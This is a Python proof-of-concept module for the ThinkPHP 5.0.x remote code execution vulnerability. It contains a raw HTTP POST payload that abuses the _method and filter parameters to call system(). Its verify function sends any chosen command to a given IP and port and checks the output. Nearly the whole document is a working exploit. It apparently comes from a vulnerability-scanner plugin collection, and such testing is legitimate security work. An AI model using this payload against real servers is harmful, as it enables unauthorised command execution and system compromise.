'''POC
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
'''

import requests


def get_info():
    return {
        "name": "ThinkPHP5 5.0.23 远程代码执行漏洞",
        "impact_range": "ThinkPHP 5.0.0-5.0.23",
        "info": "其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞",
        "fixed_time": "2019-01-11",
    }

def verify(ip, port, cmd="uname"):
    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": f"{cmd}"
    }
    response = requests.post(f"http://{ip}:{port}/index.php?s=captcha", data=data)
    if "Linux" in response.text:
        return True
    else:
        return False
    

    